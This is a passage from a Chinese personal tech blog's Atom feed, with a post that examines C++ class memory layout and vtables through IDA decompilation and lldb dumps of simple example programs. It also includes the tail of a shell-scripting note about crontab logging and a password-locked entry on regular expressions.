target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
</feed>
